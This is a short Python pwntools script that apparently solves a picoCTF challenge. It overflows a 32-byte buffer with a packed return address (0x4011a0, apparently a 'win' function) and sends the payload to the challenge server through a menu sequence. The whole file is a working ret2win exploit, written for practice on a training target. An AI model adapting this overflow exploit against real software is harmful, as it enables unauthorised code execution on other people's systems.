from pwn import *

context.bits = 64

win = p64(0x00000000004011a0)

payload = b"A"*32
payload += win

p = remote("mimas.picoctf.net", 50919)

p.sendline(b"2")
p.recvuntil(b"buffer:")
p.sendline(payload)
p.recvuntil(b"choice:")
p.sendline(b"4")
print(p.recvall())

p.interactive()
